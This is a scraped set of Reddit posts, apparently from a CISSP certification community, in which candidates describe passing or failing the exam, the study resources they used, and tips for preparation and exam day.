3021,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.  
Im not a reddit user but reading this reddit helped me much with my preparations so I decided to share my experience :)",2021-07-06

Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.

I booked the test to make sure I had a deadline. I studied a lot during my free time. I never felt prepared for this beast. I made sure that I truly understood the material and wasn’t just memorizing things. This helped me A LOT during the exam. I felt confident in maybe three of my answers. I read the question several times, read the answers, then read the question again. English is not my first language and I sometimes have a hard time figuring out what they are asking. I honestly thought I had failed. I didn’t look at the paper until I was outside the building. I almost cried when I read “Congratulations….” on the paper. I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail.

I wanna thank all of you for all the tips in this sub, it's incredible how much info we have here!!

What worked for me:

* Mike Chapple LinkedIn videos
* Sybex practice tests and the Wiley efficient learning app - This is a great platform!
* Destination Certification CISSP Mind Map on Youtube - This guy does a wonderful job of summarizing and explaining key points in each domain. I think they compliment Chapple's videos really well. I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.  

What didn't work:

* 11th Hour - so general I fell asleep
* [cisspprep.net](https://cisspprep.net) \- I picked it up on here and some of the reviews were great so I gave it a try... the website is somewhat confusing and while I got some good tips I felt like I was mostly looking to understand the author's intent in the question and what they wanted me to select than the actual info that's relevant for the exam

About me:

3047,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server. 

Thanks everybody and if you have any questions I'll be happy to answer them.",2021-06-30
3048,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days. It didn’t help that my family, coworkers and friends knew I was studying and all wished me luck… that just added pressure I didn’t need. Or maybe I did need the pressure. I’m just glad I passed. Good luck to all in your endeavors!",2021-06-29
3049,oa79co,Provisionally passed 21 June 2021,"I have followed this subreddit for a long time and wanted to contribute.  I provisionally passed on 21 June on my first attempt.  The test stopped at 137 questions with about 40 minutes remaining.  Like many others have posted, I did not feel ready.  

My study materials were:
1) The Official Study guide:  I read it cover to cover before using any other materials. Dry reading but it was a goal to get through it. 
2) Mindmap videos: These were an excellent resource.
3) Boson Practice exams:  Good resource for gaining insight on areas to focus and follow up on.
4) Thor Pederson on Udemy:  I got through the first 6 domains and then just used the practice exams.
5) Kelly Handerhan:  Listened to her course while driving and doing other tasks.  Also, Why you will pass the CISSP was key for getting the mindset right to take the test. 
6) 11th Hour study guide:  Good resource for a refresher during the last week of my study plan.
7) Various other reading materials such as Memory Palace, Sunflower guide and various NIST documents. 

I am glad it is over, and the endorsement process can begin.",2021-06-29
3050,oa7l7s,Is there any hope for someone like me?,"I’ve been in IT for a total of about 5 years. One year in Help Desk, three years in Desktop Support, and about one year in my current SysAdmin role. I have my Network+ and Security+ right now and really want to break into the InfoSec side of things. Every job posting says that CISSP is either preferred or required so I’ve been looking into it and took a couple of pre-assessment tests and made 70’s on both of them. The task still feels daunting because I’ll see people post here with 10-20 years of IT and InfoSec experience and *still* feel like the test was difficult. Is there any hope in me passing CISSP at my current level, if not what would be a valuable next step to try and get into this side of IT? 

Thanks everybody.",2021-06-29
3051,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29
3052,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29
3053,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

Find whatever works for you, and go ahead with it!",2021-06-29
3054,o9xi77,Passed today @100q,"So, I passed the exam today after finishing 100 questions. I will admit I was shocked but of course overjoyed.

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29

3056,o9m7p4,1st Attempt: Passed at Q101 ~100 minutes,"Morning All - 

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score. I believe that mentally helped significantly.

3057,oa1kel,Requiring bio-metrics for verification?,"In my country, I'm required to provide '100 points of ID' which is sufficient for most things including opening a bank account, or going to court. 

IMO Requiring bio-metrics such as hand-prints or for verification during assessments is not appropriate, both because it's a collection of private information but also because it's not in-line with the security requirement of the exam. I think CISSP needs to reevaluate this option. This is a complete invasion of privacy and not appropriate, make worse so by the fact that NO actual information is provided relating to restrictions or retention on the bio-metrics collected, this is in complete contradiction to the intended content within the damn exam!

|Resource|Format/location|Notes|
|:-|:-|:-|
|How To Think Like A Manager for the CISSP Exam (Ahmed, Luke)|Kindle edition|Read cover to cover. I found the advice and framing very helpful. (8/10)|
|CISSP Official Study Guide, 8th edition |Physical book|Read first 100 pages then used as reference. I found the style a little dry, the size intimidating, and the content occasionally lacking - a few times I came to this subreddit in frustration about missing topics. (6/10)|
|CISSP Official Study Guide, 8th edition |Digital edition (via [oreilly.com](https://oreilly.com))|This was where I consumed more of the OSG and a full-text search of a book is SO much more useful than an index which only has partial coverage. (7/10) |
|Eleventh Hour CISSP, 3rd Edition |Audio book|Listened all the way through twice. (7/10) |
|CISSP Course by Shon Harris |Videos (via [oreilly.com](https://oreilly.com)) |I found it insufferable how she began EVERY SINGLE short video with the word 'Now'. Couldn't listen after I noticed this behavioural tic. (1/10) |
|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |
|Kelly Handerhan's cybrary course |Cybrary|Excellent. (8/10) |
|Destination Certification's Mind Map series|YouTube|As others have said, I don't know how/why these are free. But they're freaking awesome. I took a week of study leave before the exam and these were the core part of that week. (10/10) |
|Prabh Nair's coffee shots |YouTube|Very helpful for filling specific knowledge gaps. And his exam summary tables are really useful. (8/10) |
|Inside Cloud and Security's CISSP Exam Cram|YouTube|Attacks and countermeasures, updates for the 2021 exam, and more. Great stuff. (8/10)|
|Kelly's Why you WILL pass the CISSP|YouTube|It's just a really useful reminder of the mindset. Watch it. (10/10)|
|Craig Cunningham ran a free online CISSP Review session|[Nomad-sec.com](https://Nomad-sec.com) |Really enjoyed this. I definitely benefited from the overall aproach and hearing him work through various ideas. (7/10)|
|[CISSPREP.net](https://CISSPREP.net) practice exams |[CISSPREP.net](https://CISSPREP.net)|Really useful. I took 3 of the 1 hr exams. (8/10)|
|Larry Greenblatt's ""CISSP 2020 Exam Tips""|YouTube|Superb! Watched this on the day of the exam and it really helped solidify the mindset. (10/10)|
|Darknet Diaries |Podcast by Jack Rhysider |Jack's got an interesting way of presenting stories and they're often a good application of the issues covered in the study material. Occasionally, he comes across as a little *too* disappointed that the criminals he's covering get punished. (7/10)|

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

I see the posts on here with people passing, and I'm asking myself ""what am I doing wrong?""  I know the material really good but for some reason the questions I'm getting on the exam are just not going well for me,  it honestly did not feel like an overly hard test,  especially this time around but something is off.  


This time around I got up to question 125 and the question was kinda easy at the end which I figured that was a way of saying I did enough to past...when that was not the case it was gut punch 😞

3072,pabhis,Provisionally passed! Here's what worked for me.,"I provisionally passed!  I am posting this to give back because I found these kinds of posts motivating when I was preparing.  Also, it's a little cathartic.  Of course, your experience will be different but here's what worked for me.

For context, I have around 15 years of experience in cyber security technical and management roles, and had just never got around to doing the test.  Like others, booking a date helped sharpen my focus.  

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

